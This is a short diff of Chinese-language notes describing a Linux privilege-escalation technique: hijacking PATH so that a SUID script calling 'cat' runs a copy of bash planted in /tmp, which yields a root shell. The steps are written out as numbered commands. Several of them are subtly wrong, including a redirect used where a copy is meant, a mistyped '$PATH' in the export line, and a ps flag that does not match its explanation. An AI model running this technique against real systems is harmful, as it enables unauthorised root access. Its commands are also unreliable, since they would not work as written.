@@ -6,13 +6,15 @@
 1.管理员在系统中执行了Linux脚本/C语言脚本，并且脚本拥有SUID权限位，普通账户拥有执行权限
 2.Webshell以及nologin, 因为无法配置环境变量
 
-假设此脚本中有"cat"命令
-
 echo $PATH
-/usr/bin/bash > /tmp/cat
+
+假设此脚本中有"cat"命令
+1./usr/bin/bash > /tmp/cat
 //将bash命令复制到自定义路径下
-export PATH=/tmp:PATH$
+2.export PATH=/tmp:PATH$
 //通过劫持环境变量
+3.添加执行权限
+4.执行有cat命令的脚本，成功打开bash
 
 ps -ep|grep <服务进程>
 //报告指定目前系统的进程状态，-e将所有进程以-f完整格式作为输出值，调用grep搜索并过滤仅打印出指定搜索进程的结果。
